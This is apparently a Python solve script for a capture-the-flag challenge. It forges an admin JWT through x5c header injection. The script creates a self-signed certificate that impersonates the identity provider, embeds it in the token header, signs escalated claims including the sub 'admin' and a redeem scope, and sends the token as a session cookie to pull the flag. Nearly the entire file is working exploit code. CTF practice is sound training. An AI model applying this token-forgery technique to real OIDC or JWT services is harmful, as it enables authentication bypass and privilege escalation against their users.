#!/usr/bin/env python3
"""
Solve script for TrustDinOIDC (CSAW CTF 2026)
Vulnerability: x5c JWT injection on StrataID IdP + scope escalation
"""
import base64
import json
import time
import datetime
import re

from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding as ap
import requests

TARGET = "https://dino2auth.ctf.csaw.io"

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# 1. Generate RSA keypair
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

# 2. Create self-signed cert with CN=strataid.example.com
subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "strataid.example.com")])
cert = (x509.CertificateBuilder()
    .subject_name(subject).issuer_name(subject)
    .public_key(key.public_key())
    .serial_number(x509.random_serial_number())
    .not_valid_before(datetime.datetime.now(datetime.UTC))
    .not_valid_after(datetime.datetime.now(datetime.UTC) + datetime.timedelta(days=365))
    .sign(key, hashes.SHA256()))
cert_b64 = base64.b64encode(cert.public_bytes(serialization.Encoding.DER)).decode()

# 3. Build forged JWT
header = {"alg": "RS256", "typ": "JWT", "x5c": [cert_b64]}
payload = {
    "iss": "strataid.example.com",
    "sub": "admin",
    "aud": "trustdinoidc-portal",
    "scope": "openid profile flagosaurus:redeem",
    "exp": int(time.time()) + 3600
}

msg = b64url_encode(json.dumps(header).encode()) + "." + b64url_encode(json.dumps(payload).encode())
sig = key.sign(msg.encode(), ap.PKCS1v15(), hashes.SHA256())
token = msg + "." + b64url_encode(sig)

# 4. Use forged JWT as session cookie
s = requests.Session()
s.cookies.set("session", token, domain="dino2auth.ctf.csaw.io", path="/")
resp = s.get(TARGET + "/")

# 5. Extract flag
flags = re.findall(r'csaw\{[^}]+\}', resp.text)
if flags:
    print(f"Flag: {flags[0]}")
else:
    print("Flag not found in response")
    print(resp.text[:500])
